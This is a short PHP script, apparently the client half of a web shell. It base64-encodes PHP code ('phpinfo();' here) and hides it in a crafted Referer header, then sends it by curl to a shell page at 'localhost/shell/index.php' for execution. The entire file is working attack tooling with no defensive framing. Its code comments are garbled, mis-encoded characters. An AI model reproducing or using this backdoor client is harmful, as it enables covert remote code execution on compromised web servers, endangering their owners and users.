<?php
    header('Content-type:text/html;charset=utf-8');
    //ҪִеĴ
    $code = "phpinfo();";
    //base64
    $code = base64_encode($code);
    //refererַ
    $referer = "a=10&b=ab&c=34&d=re&e=32&f=km&g={$code}&h=&i=";
    //url
    $url = 'http://localhost/shell/index.php';
    $ch = curl_init();
    $options = array(
        CURLOPT_URL => $url,
        CURLOPT_HEADER => FALSE,
        CURLOPT_RETURNTRANSFER => TRUE,
        CURLOPT_REFERER => $referer
    );
    curl_setopt_array($ch, $options);
    echo curl_exec($ch);
?>